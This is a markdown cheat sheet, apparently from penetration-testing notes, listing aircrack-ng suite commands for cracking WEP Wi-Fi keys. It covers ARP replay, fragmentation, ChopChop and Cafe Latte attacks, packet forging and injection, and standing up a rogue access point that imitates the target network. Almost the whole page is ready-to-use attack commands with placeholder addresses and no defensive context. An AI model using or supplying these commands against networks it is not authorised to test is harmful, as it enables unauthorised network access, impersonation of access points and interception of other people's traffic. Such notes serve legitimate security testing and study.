#wifi #wep #aircrack-ng #arp-replay

# WEP Attacks

IV-generation attacks to crack WEP. Related: [basics](basics.md) · [password-cracking](password-cracking.md)

## Capture
```bash
sudo airodump-ng wlan0mon -c 1 -w WEP
```
Capture traffic on the target channel (`--ivs` to save only IVs).

## ARP Request Replay
```bash
sudo aireplay-ng -3 -b <AP_MAC> -h <Station_MAC> wlan0mon
```
Replay ARP requests to generate IVs fast.

```bash
sudo aircrack-ng -b <AP_MAC> WEP-01.cap
```
Crack the key with the PTW attack (`-K` for Korek).

## Fragmentation Attack
```bash
sudo aireplay-ng -5 -b <AP_MAC> -h <station_MAC> wlan0mon
```
Obtain PRGA (.xor) keystream.

```bash
packetforge-ng -0 -a <AP_MAC> -h <Station_MAC> -k <AP_IP> -l <Station_IP> -y fragment.xor -w forgedarp.cap
```
Forge an ARP packet from the PRGA.

```bash
sudo aireplay-ng -2 -r forgedarp.cap -h <Source_MAC> wlan0mon
```
Inject the forged packet (interactive replay).

## Korek ChopChop
```bash
sudo aireplay-ng -4 -b <AP_MAC> -h <Station_MAC> wlan0mon
```
Recover PRGA via the chopchop attack (then forge + replay as above).

## Cafe Latte (clientless)
```bash
sudo airbase-ng -c 1 -a <AP_BSSID> -e "<AP_ESSID>" wlan0mon -W 1 -L
```
Stand up a rogue AP matching the target.

```bash
sudo aireplay-ng -6 -D -b <AP_MAC> -h <Station_MAC> wlan0mon
```
Launch the Cafe Latte attack against a roaming client.

## Identify IPs (for forging)
```bash
sudo tcpdump -s 0 -n -e -r replay_dec.cap
```
Read a decrypted replay to find source/dest IPs.
